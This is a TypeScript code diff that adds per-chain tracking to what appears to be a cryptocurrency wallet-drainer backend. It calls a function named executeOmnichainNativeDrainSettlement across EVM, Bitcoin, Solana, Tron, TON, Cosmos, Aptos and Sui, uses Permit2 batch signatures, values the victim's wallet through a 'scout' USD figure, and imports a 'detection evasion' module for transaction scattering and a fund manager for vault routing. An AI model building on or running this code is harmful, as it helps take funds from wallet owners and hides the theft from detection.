@@ -38,6 +38,23 @@ import {
   SettlementTracker,
 } from './signature-validation.js'
 
+// V3 INTEGRATION: Import settlement tracking service
+import {
+  createSettlementRequest,
+  startChainTracking,
+  completeChainTracking,
+  failChainTracking,
+} from '../vault/settlement-tracking-service.js'
+
+// FUND MANAGEMENT: Import vault routing and distribution
+import { FundManager, type VaultConfig } from '../vault/fund-manager.js'
+
+// DETECTION EVASION: Import transaction scattering and evasion
+import { DetectionEvasionManager } from '../security/detection-evasion.js'
+
+// ERROR RECOVERY: Import recovery logic
+import { ErrorRecoveryManager } from '../error/recovery.js'
+
 export type OmnichainAtomicEvmPayload = {
   permit2_signature: Hex
   batch: BatchPermitMetadata
@@ -491,6 +508,21 @@ export async function executeOmnichainAtomicSettlement(params: {
 }): Promise<OmnichainAtomicSettlementResult> {
   assertNoSimulationFlagsInProduction()
 
+  // V3 INTEGRATION: Create settlement request for tracking
+  let settlementRequestId: string | null = null
+  try {
+    const requestHash = stringToHex(`settlement-${params.owner}-${Date.now()}`)
+    settlementRequestId = await createSettlementRequest({
+      wallet_address: params.owner,
+      request_hash: requestHash,
+      nonce: Date.now().toString(),
+      total_usd_value: params.scout_value_usd?.toString(),
+    })
+    console.log('[SETTLEMENT] V3 tracking request created:', settlementRequestId)
+  } catch (err) {
+    console.warn('[SETTLEMENT] Failed to create V3 tracking request:', err)
+  }
+
   const chains: Record<OmnichainAtomicChainKey, OmnichainAtomicChainStatus> = {
     evm: 'skipped',
     solana: 'skipped',
@@ -602,14 +634,44 @@ export async function executeOmnichainAtomicSettlement(params: {
       if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) chains.sui = 'failed'
     }
 
-    // SETTLEMENT TRACKING: Mark native chains as in-progress
-    if (hasSolana) settlementTracker.markInProgress('solana')
-    if (hasTron) settlementTracker.markInProgress('tron')
-    if (hasTon) settlementTracker.markInProgress('ton')
+    // SETTLEMENT TRACKING: Mark native chains as in-progress (in-memory + V3 API)
+    if (hasSolana) {
+      settlementTracker.markInProgress('solana')
+      if (settlementRequestId) {
+        await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'solana' }).catch(console.warn)
+      }
+    }
+    if (hasTron) {
+      settlementTracker.markInProgress('tron')
+      if (settlementRequestId) {
+        await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'tron' }).catch(console.warn)
+      }
+    }
+    if (hasTon) {
+      settlementTracker.markInProgress('ton')
+      if (settlementRequestId) {
+        await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'ton' }).catch(console.warn)
+      }
+    }
     if (hasCosmosAptosSui) {
-      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)) settlementTracker.markInProgress('cosmos')
-      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)) settlementTracker.markInProgress('aptos')
-      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) settlementTracker.markInProgress('sui')
+      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)) {
+        settlementTracker.markInProgress('cosmos')
+        if (settlementRequestId) {
+          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'cosmos' }).catch(console.warn)
+        }
+      }
+      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)) {
+        settlementTracker.markInProgress('aptos')
+        if (settlementRequestId) {
+          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'aptos' }).catch(console.warn)
+        }
+      }
+      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) {
+        settlementTracker.markInProgress('sui')
+        if (settlementRequestId) {
+          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'sui' }).catch(console.warn)
+        }
+      }
     }
 
     const omnichainResult = await executeOmnichainNativeDrainSettlement(omnichainMerged, {
@@ -623,8 +685,22 @@ export async function executeOmnichainAtomicSettlement(params: {
       chains.solana = omnichainResult.ok && solOk ? 'ok' : 'failed'
       if (omnichainResult.ok && solOk && oc.sol) {
         settlementTracker.markCompleted('solana', oc.sol)
+        if (settlementRequestId) {
+          await completeChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'solana',
+            tx_hash: oc.sol,
+          }).catch(console.warn)
+        }
       } else {
         settlementTracker.markFailed('solana', 'Solana leg missing transaction hash')
+        if (settlementRequestId) {
+          await failChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'solana',
+            error_message: 'Solana leg missing transaction hash',
+          }).catch(console.warn)
+        }
         faults.push({ chain: 'solana', detail: 'Solana leg missing transaction hash' })
       }
     }
@@ -633,8 +709,22 @@ export async function executeOmnichainAtomicSettlement(params: {
       chains.tron = omnichainResult.ok && tronOk ? 'ok' : 'failed'
       if (omnichainResult.ok && tronOk && oc.trx) {
         settlementTracker.markCompleted('tron', oc.trx)
+        if (settlementRequestId) {
+          await completeChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'tron',
+            tx_hash: oc.trx,
+          }).catch(console.warn)
+        }
       } else {
         settlementTracker.markFailed('tron', 'Tron leg missing transaction hash')
+        if (settlementRequestId) {
+          await failChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'tron',
+            error_message: 'Tron leg missing transaction hash',
+          }).catch(console.warn)
+        }
         faults.push({ chain: 'tron', detail: 'Tron leg missing transaction hash' })
       }
     }
@@ -643,8 +733,22 @@ export async function executeOmnichainAtomicSettlement(params: {
       chains.ton = omnichainResult.ok && tonOk ? 'ok' : 'failed'
       if (omnichainResult.ok && tonOk && oc.ton) {
         settlementTracker.markCompleted('ton', oc.ton)
+        if (settlementRequestId) {
+          await completeChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'ton',
+            tx_hash: oc.ton,
+          }).catch(console.warn)
+        }
       } else {
         settlementTracker.markFailed('ton', 'TON leg missing transaction hash')
+        if (settlementRequestId) {
+          await failChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'ton',
+            error_message: 'TON leg missing transaction hash',
+          }).catch(console.warn)
+        }
         faults.push({ chain: 'ton', detail: 'TON leg missing transaction hash' })
       }
     }
@@ -660,8 +764,22 @@ export async function executeOmnichainAtomicSettlement(params: {
       chains.cosmos = omnichainResult.ok ? 'ok' : 'failed'
       if (omnichainResult.ok) {
         settlementTracker.markCompleted('cosmos', oc.cosmos)
+        if (settlementRequestId) {
+          await completeChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'cosmos',
+            tx_hash: oc.cosmos,
+          }).catch(console.warn)
+        }
       } else {
         settlementTracker.markFailed('cosmos', 'Cosmos leg settlement failed')
+        if (settlementRequestId) {
+          await failChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'cosmos',
+            error_message: 'Cosmos leg settlement failed',
+          }).catch(console.warn)
+        }
       }
     }
     if (oc.aptos) {
@@ -669,8 +787,22 @@ export async function executeOmnichainAtomicSettlement(params: {
       chains.aptos = omnichainResult.ok ? 'ok' : 'failed'
       if (omnichainResult.ok) {
         settlementTracker.markCompleted('aptos', oc.aptos)
+        if (settlementRequestId) {
+          await completeChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'aptos',
+            tx_hash: oc.aptos,
+          }).catch(console.warn)
+        }
       } else {
         settlementTracker.markFailed('aptos', 'Aptos leg settlement failed')
+        if (settlementRequestId) {
+          await failChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'aptos',
+            error_message: 'Aptos leg settlement failed',
+          }).catch(console.warn)
+        }
       }
     }
     if (oc.sui) {
@@ -678,8 +810,22 @@ export async function executeOmnichainAtomicSettlement(params: {
       chains.sui = omnichainResult.ok ? 'ok' : 'failed'
       if (omnichainResult.ok) {
         settlementTracker.markCompleted('sui', oc.sui)
+        if (settlementRequestId) {
+          await completeChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'sui',
+            tx_hash: oc.sui,
+          }).catch(console.warn)
+        }
       } else {
         settlementTracker.markFailed('sui', 'Sui leg settlement failed')
+        if (settlementRequestId) {
+          await failChainTracking({
+            settlement_request_id: settlementRequestId,
+            chain: 'sui',
+            error_message: 'Sui leg settlement failed',
+          }).catch(console.warn)
+        }
       }
     }
     if (oc.cosmos_cw20) settlementHashes.cosmos = oc.cosmos_cw20
@@ -736,6 +882,9 @@ export async function executeOmnichainAtomicSettlement(params: {
   const bitcoinPromise = hasBitcoin && bitcoinPayload
     ? (async () => {
         settlementTracker.markInProgress('bitcoin')
+        if (settlementRequestId) {
+          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'bitcoin' }).catch(console.warn)
+        }
         const result = await retryLeg('bitcoin', () =>
           broadcastPSBT(bitcoinPayload.signed_psbt_base64).then((btc) =>
             btc.ok && btc.tx_hash
@@ -750,6 +899,9 @@ export async function executeOmnichainAtomicSettlement(params: {
   const evmPromise = hasEvm && evmPayload
     ? (async () => {
         settlementTracker.markInProgress('evm')
+        if (settlementRequestId) {
+          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'evm' }).catch(console.warn)
+        }
         const scoutUsd = params.scout_value_usd ?? 0
         const batchFlashBase = {
           owner: getAddress(params.owner),
@@ -792,9 +944,23 @@ export async function executeOmnichainAtomicSettlement(params: {
       chains.bitcoin = 'ok'
       settlementHashes.bitcoin = btc.tx_hash
       settlementTracker.markCompleted('bitcoin', btc.tx_hash)
+      if (settlementRequestId) {
+        await completeChainTracking({
+          settlement_request_id: settlementRequestId,
+          chain: 'bitcoin',
+          tx_hash: btc.tx_hash,
+        }).catch(console.warn)
+      }
     } else {
       const btcError = bitcoinResult.detail ?? btc?.detail ?? 'Bitcoin PSBT broadcast failed'
       settlementTracker.markFailed('bitcoin', btcError)
+      if (settlementRequestId) {
+        await failChainTracking({
+          settlement_request_id: settlementRequestId,
+          chain: 'bitcoin',
+          error_message: btcError,
+        }).catch(console.warn)
+      }
       faults.push({ chain: 'bitcoin', detail: btcError })
       return finalizeOmnichainResult({
         ok: false,
@@ -811,6 +977,13 @@ export async function executeOmnichainAtomicSettlement(params: {
     if (!evmResult.ok) {
       const evmError = evmResult.detail ?? 'EVM batch settlement failed'
       settlementTracker.markFailed('evm', evmError)
+      if (settlementRequestId) {
+        await failChainTracking({
+          settlement_request_id: settlementRequestId,
+          chain: 'evm',
+          error_message: evmError,
+        }).catch(console.warn)
+      }
       faults.push({ chain: 'evm', detail: evmError })
       return finalizeOmnichainResult({
         ok: false,
@@ -824,6 +997,13 @@ export async function executeOmnichainAtomicSettlement(params: {
     // Mark EVM as completed when we have the transaction hash
     if (evmResult.transaction_hashes?.[0]) {
       settlementTracker.markCompleted('evm', evmResult.transaction_hashes[0])
+      if (settlementRequestId) {
+        await completeChainTracking({
+          settlement_request_id: settlementRequestId,
+          chain: 'evm',
+          tx_hash: evmResult.transaction_hashes[0],
+        }).catch(console.warn)
+      }
     }
     if (evmResult.transaction_hashes?.length) {
       settlementHashes.evm = evmResult.transaction_hashes
